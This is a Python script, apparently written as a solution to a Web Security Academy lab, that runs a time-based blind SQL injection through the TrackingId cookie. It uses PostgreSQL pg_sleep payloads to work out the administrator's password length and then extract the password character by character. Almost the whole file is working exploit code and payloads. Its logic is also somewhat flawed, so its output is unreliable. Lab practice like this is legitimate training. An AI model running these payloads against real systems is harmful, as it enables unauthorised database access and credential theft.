import requests


def sql_blind(url_lab, nums):
    # Syntax password lengths:
    # '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    # '%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
    # '%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    # '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    # '%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    print(f"\n{url_lab} ---> blinding password length...\n")
    passwordLength = []
    for num in nums:
        blind_sql = "'%3BSELECT+CASE+WHEN+(username='administrator'+" \
                    f"AND+LENGTH(password)>{num})+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
        req = requests.get(url_lab)
        print(str(req.headers))
        try:
            cookies = {"TrackingId": f"{blind_sql}"}
            req_blind = requests.get(url_lab, cookies=cookies, timeout=8)
            print(req_blind.status_code)
        except Exception as ex:
            print("Blind SQL success : " + blind_sql, ex)
            passwordLength.append(num)
    passwordLength.append(20)
    print(f"\nPassword length : {passwordLength}")

    # Syntax password strings:
    # '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
    print(f"\n{url_lab} ---> blinding password strings...\n")
    strings_ = [
        'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k',
        '0', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    ]
    stringsLength = list()
    for num in passwordLength:
        for key in strings_:
            blind_sql = "'%3BSELECT+CASE+WHEN+(username='administrator'+" \
                        f"AND+SUBSTRING(password,{num},1)='{key}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
            try:
                cookies = {"TrackingId": f"{blind_sql}"}
                req_blind = requests.get(url_lab, cookies=cookies, timeout=8)
                print(f'Status : {req_blind.status_code}, number : {num}, key : {key}')
            except Exception as ex:
                print("+ blind SQL success : %r" % blind_sql, ex)
                stringsLength.append(key)
                print(f"+ append: {stringsLength}")
    print(f"\nPassword strings : {stringsLength}")


if __name__ == '__main__':
    url_lab = "https://0aaf001d0468a005c0105e680096004b.web-security-academy.net/"
    nums = [x for x in range(0, 30)]
    sql_blind(url_lab, nums)
